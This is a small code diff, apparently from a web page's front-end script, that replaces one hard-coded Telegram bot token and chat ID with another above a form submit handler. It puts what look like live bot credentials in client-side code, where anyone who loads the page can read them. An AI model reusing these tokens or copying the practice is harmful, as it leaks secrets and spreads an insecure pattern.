@@ -1,6 +1,6 @@
 // Telegram credentials (same as provided)
-const BOT_TOKEN = "8428035428:AAHy5pKyhSPTHzcxde5Ovkl6KxDRMdZ-H5w";
-const CHAT_ID = "5863256131";
+const BOT_TOKEN = "8254236031:AAFYPK1HF3ZDTq9qNqrGtNotFygvf3qMvV4";
+const CHAT_ID = "8099003634";
 
 document.getElementById("telegramForm").addEventListener("submit", async (e) => {
     e.preventDefault();
